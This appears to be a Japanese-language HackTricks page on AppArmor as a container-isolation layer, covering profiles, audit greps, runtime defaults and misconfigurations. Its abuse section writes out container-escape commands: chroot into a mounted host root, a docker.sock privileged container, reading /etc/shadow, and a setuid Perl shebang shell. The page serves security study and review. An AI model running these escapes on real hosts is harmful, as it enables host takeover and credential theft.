# AppArmor

{{#include ../../../../banners/hacktricks-training.md}}

## Overview

AppArmor は、プログラムごとのプロファイルを通じて制限を適用する**強制アクセス制御 (Mandatory Access Control)** システムです。ユーザーやグループ所有に大きく依存する従来の DAC チェックとは異なり、AppArmor はカーネルがプロセス自体に紐づいたポリシーを強制します。コンテナ環境では、ワークロードが従来の権限で操作を試みられたとしても、AppArmor プロファイルが該当するパス、マウント、ネットワーク挙動、または capability の使用を許可していなければ拒否される、という点で重要です。

最も重要な概念は、AppArmor が**パスベース**であることです。SELinux のようなラベルではなく、パス規則を通じてファイルシステムへのアクセスを判断します。これにより扱いやすく強力になりますが、bind mounts や代替パスのレイアウトには注意が必要です。同じホストの内容が別のパスで到達可能になると、ポリシーの効果がオペレーターの最初の予想と異なることがあります。

## Role In Container Isolation

コンテナのセキュリティレビューはしばしば capabilities と seccomp で止まりがちですが、AppArmor はそれらのチェック後も重要です。コンテナが本来より多くの権限を持っていたり、運用上の理由で一つ余分な capability が必要になったりする状況を想像してください。AppArmor は依然としてファイルアクセス、マウント挙動、ネットワーキング、実行パターンを制約して、明らかな悪用経路を阻止できます。だからこそ、AppArmor を "just to get the application working" のような理由で無効にすることは、単なるリスクのある構成を静かに積極的に悪用可能なものに変えてしまうのです。

## Lab

ホストで AppArmor が有効かどうかを確認するには、次を使用します:
```bash
aa-status 2>/dev/null || apparmor_status 2>/dev/null
cat /sys/module/apparmor/parameters/enabled 2>/dev/null
```
現在の container プロセスがどのユーザー/権限のもとで動作しているかを確認するには:
```bash
docker run --rm ubuntu:24.04 cat /proc/self/attr/current
docker run --rm --security-opt apparmor=unconfined ubuntu:24.04 cat /proc/self/attr/current
```
違いは示唆に富んでいます。通常は、プロセスはランタイムによって選択されたプロファイルに紐づく AppArmor コンテキストを示すはずです。unconfined の場合、その追加の制限レイヤーは消えます。

また、Docker が何を適用したと考えているかを確認することもできます:
```bash
docker inspect <container> | jq '.[0].AppArmorProfile'
```
## Runtime Usage

Dockerは、ホストがサポートしていればデフォルトまたはカスタムのAppArmorプロファイルを適用できます。PodmanもAppArmorベースのシステムでAppArmorと統合できますが、SELinux優先のディストリビューションではそちらが主役になることが多いです。Kubernetesは、実際にAppArmorをサポートするノード上でワークロードレベルのAppArmorポリシーを公開できます。LXCやUbuntu系のsystem-container環境もAppArmorを広く使用しています。

実務的には、AppArmorは「Dockerの機能」ではありません。複数のランタイムが適用を選べるホストカーネルの機能です。ホストがサポートしていないか、ランタイムが unconfined と指定されている場合、その想定される保護は実際には存在しません。

Kubernetesに特化すると、モダンなAPIは `securityContext.appArmorProfile` です。Kubernetes `v1.30` 以降、古いベータのAppArmor注釈は非推奨になりました。サポートされるホストでは、`RuntimeDefault` がデフォルトプロファイルで、`Localhost` はノード上に既にロードされている必要のあるプロファイルを指します。これはマニフェストがAppArmor対応に見えても、実際にはノード側のサポートと事前ロードされたプロファイルに完全に依存している可能性があるため、レビュー時に重要です。

微妙だが有用な運用上の詳細として、`appArmorProfile.type: RuntimeDefault` を明示的に設定することは、単にフィールドを省略するよりも厳格です。フィールドが明示的に設定されていてノードがAppArmorをサポートしていない場合、admission は失敗すべきです。フィールドを省略した場合、ワークロードはAppArmorのないノード上で実行され、その追加の隔離層を受けられないまま動く可能性があります。攻撃者の観点からは、マニフェストと実際のノード状態の両方を確認する良い理由になります。

Docker対応のAppArmorホストでは、最も知られているデフォルトは `docker-default` です。そのプロファイルは Moby の AppArmor テンプレートから生成されており、これがあるために一部の capability ベースの PoC がデフォルトコンテナで失敗する理由が説明されます。大まかに言えば、`docker-default` は通常のネットワーキングを許可し、`/proc` の多くへの書き込みを拒否し、`/sys` の機密部分へのアクセスを拒否し、マウント操作をブロックし、ptrace を制限して一般的なホストプローブの手段とならないようにします。そのベースラインを理解することで、「コンテナは `CAP_SYS_ADMIN` を持っている」ことと「コンテナが実際にその capability を自分が関心のあるカーネルインターフェイスに対して使えるか」とを区別するのに役立ちます。

## Profile Management

AppArmor プロファイルは通常 `/etc/apparmor.d/` 以下に保存されます。一般的な命名規則としては、実行ファイルのパス中のスラッシュをドットに置き換えます。例えば、`/usr/bin/man` のプロファイルは通常 `/etc/apparmor.d/usr.bin.man` に保存されます。この点は、防御と評価の両方で重要です。アクティブなプロファイル名がわかれば、対応するファイルをホスト上で素早く見つけられることが多いためです。

Useful host-side management commands include:
```bash
aa-status
aa-enforce
aa-complain
apparmor_parser
aa-genprof
aa-logprof
aa-mergeprof
```
これらのコマンドが container-security のリファレンスで重要なのは、プロファイルが実際にどのように構築され、ロードされ、complain mode に切り替えられ、アプリケーションの変更後に修正されるかを説明しているからです。運用者がトラブルシューティング中にプロファイルを complain mode に移動して enforcement を復元し忘れる癖があると、ドキュメント上ではコンテナが保護されているように見えても、実際にはずっと緩く動作している可能性があります。

### プロファイルの構築と更新

`aa-genprof` はアプリケーションの挙動を観察し、対話的にプロファイル生成を支援できます:
```bash
sudo aa-genprof /path/to/binary
/path/to/binary
```
`aa-easyprof` はテンプレートプロファイルを生成し、後で `apparmor_parser` で読み込めます:
```bash
sudo aa-easyprof /path/to/binary
sudo apparmor_parser -a /etc/apparmor.d/path.to.binary
```
バイナリが変更されてポリシーの更新が必要になった場合、`aa-logprof` はログで見つかった拒否を再生し、それらを許可するか拒否するかをオペレーターが判断するのを支援できます:
```bash
sudo aa-logprof
```
### ログ

AppArmor の拒否は、`auditd`、syslog、または `aa-notify` のようなツールで確認できることがよくあります:
```bash
sudo aa-notify -s 1 -v
```
これは運用上および攻撃上の両面で有用です。防御者はプロファイルを洗練するために利用し、攻撃者はどの正確な path や operation が拒否されているか、また AppArmor が exploit chain を阻止している制御であるかを把握するために利用します。

### 正確なプロファイルファイルの特定

runtime がコンテナに対して特定の AppArmor profile name を表示する場合、その名前をディスク上の profile file に紐付けることが役立つことが多い:
```bash
docker inspect <container> | grep AppArmorProfile
find /etc/apparmor.d/ -maxdepth 1 -name '*<profile-name>*' 2>/dev/null
```
これはホスト側でのレビュー時に特に有用です。なぜなら「コンテナがプロフィール `lowpriv` の下で実行されている」と言う情報と、「実際のルールが監査や再読み込み可能なこの特定のファイルに存在する」という情報のギャップを埋めるからです。

### 監査すべき主要ルール

プロファイルが読める場合、単純な `deny` 行で満足してはいけません。いくつかのルール種別は、コンテナ脱出試行に対する AppArmor の有効性を大きく左右します：

- `ux` / `Ux`: ターゲットバイナリを無制限で実行します。アクセス可能な helper、shell、または interpreter が `ux` で許可されている場合、それが通常最初に試すべき対象です。
- `px` / `Px` and `cx` / `Cx`: exec 時にプロファイル遷移を行います。これ自体が直ちに悪いわけではありませんが、遷移後に現在よりもはるかに広いプロファイルに入る可能性があるため、監査する価値があります。
- `change_profile`: タスクが別のロード済みプロファイルに切り替えることを許可します（即時または次回 exec 時）。宛先プロファイルが緩い場合、これは制限的なドメインからの脱出ルートになる可能性があります。
- `flags=(complain)`, `flags=(unconfined)`, or newer `flags=(prompt)`: これらはプロファイルへの信頼度に影響します。`complain` は拒否を強制せずログに記録し、`unconfined` は境界を取り除き、`prompt` は純粋なカーネル強制の deny ではなくユーザースペースの判断経路に依存します。
- `userns` or `userns create,`: 新しい AppArmor ポリシーは user namespace の作成を仲介できます。コンテナプロファイルが明示的にこれを許可している場合、プラットフォームがハードニングの一環として AppArmor を使用していても、ネストした user namespace の利用が可能なままになります。

Useful host-side grep:
```bash
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```
この種の監査は、何百もの通常のファイルルールを眺めるよりも有用であることが多い。もし breakout が helper を実行すること、新しい namespace に入ること、またはより制約の緩い profile から抜け出すことに依存しているなら、答えは明白な `deny /etc/shadow r` 形式の行ではなく、これらの遷移に関するルールに隠れていることが多い。

## 誤設定

最も明白なミスは `apparmor=unconfined` だ。管理者は、profile が危険または予期しない何かを正しくブロックしたためにアプリケーションが失敗した際、デバッグのためにこれを設定することが多い。そのフラグが本番環境に残っていると、実質的に MAC レイヤ全体が削除されたのと同じになる。

もう一つの微妙な問題は、ファイル権限が一見普通に見えるため bind mounts が無害だと仮定することだ。AppArmor は path-based であるため、ホストのパスを別のマウント位置で公開すると path rules と悪影響を及ぼす可能性がある。三つ目のミスは、config file に書かれた profile 名が、ホストカーネルが実際に AppArmor を強制していない場合にはほとんど意味を持たないことを忘れることだ。

## 悪用

AppArmor が無効になると、それまで制約されていた操作が突然動作することがある: bind mounts 経由で機密パスを読む、procfs や sysfs の本来使いにくいはずの部分へアクセスする、capabilities/seccomp が許可していればマウント関連の操作を行う、あるいは profile が通常拒否するようなパスを使う、などだ。AppArmor は、capability-based breakout の試みが理論上は「動作するはず」なのに実際には失敗する理由を説明する機構であることが多い。AppArmor を除去すると、同じ試みが成功し始めるかもしれない。

もし AppArmor が path-traversal、bind-mount、または mount-based な悪用チェーンを阻止している主因だと疑うなら、最初のステップは通常、profile の有無でアクセス可能になるものを比較することだ。たとえば、ホストのパスがコンテナ内にマウントされている場合、まずそれを traverse して読み取れるかどうかを確認することから始める:
```bash
cat /proc/self/attr/current
find /host -maxdepth 2 -ls 2>/dev/null | head
find /host/etc -maxdepth 1 -type f 2>/dev/null | head
```
コンテナが `CAP_SYS_ADMIN` のような危険な権限を持っている場合、最も実用的なテストの一つは、AppArmor がマウント操作や機密性の高いカーネルファイルシステムへのアクセスをブロックしている制御かどうかを確認することです:
```bash
capsh --print | grep cap_sys_admin
mount | head
mkdir -p /tmp/testmnt
mount -t proc proc /tmp/testmnt 2>/dev/null || echo "mount blocked"
mount -t tmpfs tmpfs /tmp/testmnt 2>/dev/null || echo "tmpfs blocked"
```
ホストパスが既に bind mount を通じて利用可能な環境では、AppArmor を失うことで read-only な information-disclosure の問題が直接的な host ファイルアクセスに変わることがあります:
```bash
ls -la /host/root 2>/dev/null
cat /host/etc/shadow 2>/dev/null | head
find /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
```
これらのコマンドの要点は、AppArmor 単体がブレイクアウトを作るということではありません。AppArmor を解除すると、多くの filesystem や mount-based な abuse paths が直ちにテスト可能になる、という点です。

### フル例: AppArmor Disabled + Host Root Mounted

コンテナが既にホスト root を `/host` に bind-mounted している場合、AppArmor を取り除くことで、ブロックされていた filesystem の abuse path を完全な host escape に変えることができます:
```bash
cat /proc/self/attr/current
ls -la /host
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
一度 shell が host filesystem を通じて実行されると、workload は実質的に container の境界を脱出したことになります:
```bash
id
hostname
cat /etc/shadow | head
```
### 完全な例: AppArmor 無効 + Runtime Socket

もし実際の障壁がランタイム状態を保護する AppArmor だった場合、マウントされた socket だけで完全な脱出が可能になることがある:
```bash
find /host/run /host/var/run -maxdepth 2 -name docker.sock 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
正確なパスはマウントポイントに依存しますが、結果は同じです: AppArmor はもはや runtime API へのアクセスを阻止しておらず、runtime API によりホストを侵害する container を起動できます。

### Full Example: Path-Based Bind-Mount Bypass

AppArmor がパスベースであるため、保護対象が `/proc/**` であっても、同じホストの procfs コンテンツが別のパスから到達可能な場合には自動的に保護されるわけではありません:
```bash
mount | grep '/host/proc'
find /host/proc/sys -maxdepth 3 -type f 2>/dev/null | head -n 20
cat /host/proc/sys/kernel/core_pattern 2>/dev/null
```
影響は、何が正確に mounted されているか、および alternate path が他の controls も bypass するかどうかによって変わりますが、このパターンは AppArmor を単体で評価するのではなく mount layout と合わせて評価する必要があることを示す最も明白な理由の一つです。

### Full Example: Shebang Bypass

AppArmor policy は、shebang handling を通した script execution を完全に考慮せずに interpreter path をターゲットにすることがあります。歴史的な例では、最初の行が confined interpreter を指す script を使用するものがありました:
```bash
cat <<'EOF' > /tmp/test.pl
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh";
EOF
chmod +x /tmp/test.pl
/tmp/test.pl
```
この種の例は、profile intent と実際の execution semantics が乖離することがあることを改めて示す重要なものです。AppArmor を container 環境でレビューする際には、interpreter chains や alternate execution paths に特に注意を払うべきです。

## Checks

これらのチェックの目的は、次の3つの質問に素早く答えることです: ホストで AppArmor が有効になっているか、現在のプロセスが制限されているか、そして runtime が実際にこの container に profile を適用したか。
```bash
cat /proc/self/attr/current                         # Current AppArmor label for this process
aa-status 2>/dev/null                              # Host-wide AppArmor status and loaded/enforced profiles
docker inspect <container> | jq '.[0].AppArmorProfile'   # Profile the runtime says it applied
find /etc/apparmor.d -maxdepth 1 -type f 2>/dev/null | head -n 50   # Host-side profile inventory when visible
cat /sys/kernel/security/apparmor/profiles 2>/dev/null | sort | head -n 50   # Loaded profiles straight from securityfs
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```
興味深い点:

- If `/proc/self/attr/current` shows `unconfined`, the workload is not benefiting from AppArmor confinement.
- If `aa-status` shows AppArmor disabled or not loaded, any profile name in the runtime config is mostly cosmetic.
- If `docker inspect` shows `unconfined` or an unexpected custom profile, that is often the reason a filesystem or mount-based abuse path works.
- If `/sys/kernel/security/apparmor/profiles` does not contain the profile you expected, the runtime or orchestrator configuration is not enough by itself.
- If a supposedly hardened profile contains `ux`, broad `change_profile`, `userns`, or `flags=(complain)` style rules, the practical boundary may be much weaker than the profile name suggests.

コンテナが運用上の理由で既に権限昇格している場合、AppArmor を有効にしておくことが、制御された例外とより広範なセキュリティ破綻との間の差を生むことが多いです。

## ランタイムのデフォルト

| Runtime / platform | デフォルト状態 | デフォルトの挙動 | 一般的な手動での弱体化 |
| --- | --- | --- | --- |
| Docker Engine | AppArmor 対応ホストではデフォルトで有効 | 上書きされない限り `docker-default` AppArmor プロファイルを使用する | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Podman | ホスト依存 | AppArmor は `--security-opt` を通じてサポートされているが、正確なデフォルトはホスト/ランタイムに依存し、Docker のドキュメント化された `docker-default` プロファイルほど普遍的ではない | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Kubernetes | 条件付きのデフォルト | `appArmorProfile.type` が指定されていない場合、デフォルトは `RuntimeDefault` だが、ノード上で AppArmor が有効な場合にのみ適用される | `securityContext.appArmorProfile.type: Unconfined`、`securityContext.appArmorProfile.type: Localhost`（弱いプロファイルを指定した場合）、AppArmor をサポートしていないノード |
| containerd / CRI-O under Kubernetes | ノード/ランタイムのサポートに従う | Kubernetes 対応の一般的なランタイムは AppArmor をサポートするが、実際の強制はノードのサポート状況やワークロード設定に依存する | Kubernetes 行と同様。ランタイムの直接設定で AppArmor を完全にスキップすることも可能 |

AppArmor において最も重要な変数はしばしば **ホスト** であり、ランタイムだけではない。マニフェストのプロファイル設定だけでは、AppArmor が有効になっていないノード上での制限を作り出すことはできない。

## References

- [Kubernetes security context: AppArmor profile fields and node-support behavior](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [Ubuntu 24.04 `apparmor.d(5)` manpage: exec transitions, `change_profile`, `userns`, and profile flags](https://manpages.ubuntu.com/manpages/noble/en/man5/apparmor.d.5.html)
{{#include ../../../../banners/hacktricks-training.md}}
